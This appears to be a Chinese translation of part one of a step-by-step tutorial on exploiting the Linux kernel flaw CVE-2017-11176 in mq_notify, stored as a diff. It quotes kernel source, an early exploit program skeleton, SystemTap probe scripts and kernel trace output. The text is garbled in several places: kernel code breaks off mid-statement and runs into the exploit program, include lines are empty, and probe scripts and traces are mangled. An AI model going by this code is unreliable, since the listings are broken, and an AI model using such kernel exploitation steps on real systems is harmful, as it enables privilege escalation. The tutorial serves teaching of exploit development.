@@ -1,0 +1,123 @@
+**本文翻译自：[CVE-2017-11176: A step-by-step Linux Kernel exploitation (part
+1/4)](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html)**
+译者注：由于有点长，所以分成了两部分，[前一部分链接](https://xz.aliyun.com/t/5185)
+# Reaching the Retry Logic
+在上一节中，我们分析了漏洞并设计了一个可以触发漏洞的攻击场景。在本节中，我们将看到如何触发漏洞代码（retry部分）并开始编写漏洞利用代码。
+实际上，在开始前，我们必须检查该漏洞是否是可利用的。如果我们甚至无法到达有漏洞的代码路径（由于一些安全检查不满足），那就没有理由继续了。
+## 分析retry前的代码
+像大多数系统调用一样， _mq_notify_ 首先使用copy_from_user()函数将用户空间的数据拷贝到内核空间：
+    SYSCALL_DEFINE2(mq_notify, mqd_t, mqdes,
+            const struct sigevent __user *, u_notification)
+        {
+          int ret;
+          struct file *filp;
+          struct sock *sock;
+          struct inode *inode;
+          struct sigevent notification;
+          struct mqueue_inode_info *info;
+          struct sk_buff *nc;
+    [0]   if (u_notification) {
+    [1]     if (copy_from_user(&notification, u_notification,
+                  sizeof(struct sigevent)))
+              return -EFAULT;
+          }
+          audit_mq_notify(mqdes, u_notification ? &notification : NULL);  // data,
+                  notification.sigev_value.sival_ptr,
+                  NOTIFY_COOKIE_LEN)) {
+                ret = -EFAULT;
+                goto out;
+              }
+              /* TODO: add a header? */
+              skb_put(nc, NOTIFY_COOKIE_LEN);
+              /* and attach it to the socket */
+        retry:                                    // 
+        #include 
+        #include 
+        #define NOTIFY_COOKIE_LEN (32)
+        int main(void)
+        {
+          struct sigevent sigev;
+          char sival_buffer[NOTIFY_COOKIE_LEN];
+          printf("-={ CVE-2017-11176 Exploit }=-\n");
+          // initialize the sigevent structure
+          memset(&sigev, 0, sizeof(sigev));
+          sigev.sigev_notify = SIGEV_THREAD;
+          sigev.sigev_value.sival_ptr = sival_buffer;
+          if (mq_notify((mqd_t)-1, &sigev))
+          {
+            perror("mqnotify");
+            goto fail;
+          }
+          printf("mqnotify succeed\n");
+          // TODO: exploit
+          return 0;
+        fail:
+          printf("exploit failed!\n");
+          return -1;
+        }
+建议使用Makefile来简化漏洞利用开发（可以很方便构建并运行脚本）。编译的时候需要带有 **-lrt** 编译参数，代码中要使用 _mq_notify_
+就需要加这个参数（gcc -lrt）。此外，建议使用 **-O0** 编译参数来避免gcc重新排序我们的代码（它可能导致难以调试的错误）。
+    -={ CVE-2017-11176 Exploit }=-    mqnotify: Bad file descriptor
+    exploit failed!
+mq_notify返回“Bad file
+descriptor”，相当于“-EBADF”。有三个地方可能产生此错误。可能是两个fget()调用之一，也可能是后面的 _(filp- >f_op !=
+&mqueue_file_operations)_检查。
+## Hello System Tap!
+在漏洞利用开发的早期阶段，强烈建议在带有调试符号的内核中运行漏洞，它允许使用 **SystemTap**
+！SystemTap是一个很棒的工具，可以在不进入gdb的情况下直接探测内核。它使过程可视化变得容易。
+让我们从基本的System Tap（stap）脚本开始：
+    # mq_notify.stp
+        probe syscall.mq_notify
+        {
+          if (execname() == "exploit")
+          {
+            printf("\n\n(%d-%d) >>> mq_notify (%s)\n", pid(), tid(), argstr)
+          }
+        }
+        probe syscall.mq_notify.return
+        {
+          if (execname() == "exploit")
+          {
+            printf("(%d-%d) >> mq_notify (-1, 0x7ffdd7421400)
+    (14427-14427) > fget (%s)\n", pid(), tid(), $$parms)
+          }
+        }
+**WARNING** :由于某种原因，并非所有内核函数都可以使用钩子。在出错情况下，System Tap会通知你并拒绝启动脚本。
+让我们为 _mq_notify()_ 中调用的每一个函数添加相应探针，以查看代码流并重新运行exp：
+    (17850-17850) [SYSCALL] ==>> mq_notify (-1, 0x7ffc30916f50)
+    (17850-17850) [uland] ==>> copy_from_user ()
+    (17850-17850) [skb] ==>> alloc_skb (priority=0xd0 size=0x20)
+    (17850-17850) [uland] ==>> copy_from_user ()
+    (17850-17850) [skb] ==>> skb_put (skb=0xffff88002e061200 len=0x20)
+    (17850-17850) [skb] > fget (fd=0x3)
+    (17850-17850) [vfs] > netlink_getsockbyfilp (filp=0xffff88002e271280)
+    (17850-17850) [netlink] > netlink_attachskb (sk=0xffff88002ff82800 skb=0xffff88002e061200 timeo=0xffff88002e1f3f40 ssk=0x0)
+    (17850-17850) [netlink] > fget (fd=0xffffffff)
+    (17850-17850) [vfs] > netlink_detachskb (sk=0xffff88002ff82800 skb=0xffff88002e061200)
+    (17850-17850) [netlink] > mq_notify (-1, 0x7ffdd9257e60)
+显然，传递给系统调用 _mq_notify_ 的结构体与我们在exp中提供的不同。这意味着system tap是有问题的（有可能）或者......
+... **我们被库封装骗了**
+让我们解决这个问题，通过syscall()系统调用来直接调用 _mq_notify_ 。
+首先添加以下头文件，以及我们自己的包装器：
+    #define _GNU_SOURCE
+        #include 
+        #include 
+        #define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
+另外，请记住在Makefile中删除“-lrt”（我们现在直接使用syscall）。
+将sigev_signo显式设置为'-1'，因为0实际上是一个有效的文件描述符，并使用包装器：
+    int main(void)
+          {
+            // ... cut ...
+            sigev.sigev_signo = -1;
+            printf("sigev = 0x%p\n", &sigev);
+            if (_mq_notify((mqd_t)-1, &sigev))
+            // ... cut ...
+          }
+运行
+    -={ CVE-2017-11176 Exploit }=-    sigev = 0x0x7fffb7eab660
+    mq_notify: Bad file descriptor
+    exploit failed!
+    (18771-18771) [SYSCALL] ==>> mq_notify (-1, 0x7fffb7eab660)           // > copy_from_user ()
+    (18771-18771) [skb] ==>> alloc_skb (priority=0xd0 size=0x20)
+    (18771-18771) [uland] ==>> copy_from_user ()
+    (18771-18771) [skb] ==>> skb_put (skb=0xffff88003d2e95c0 len=0x20)
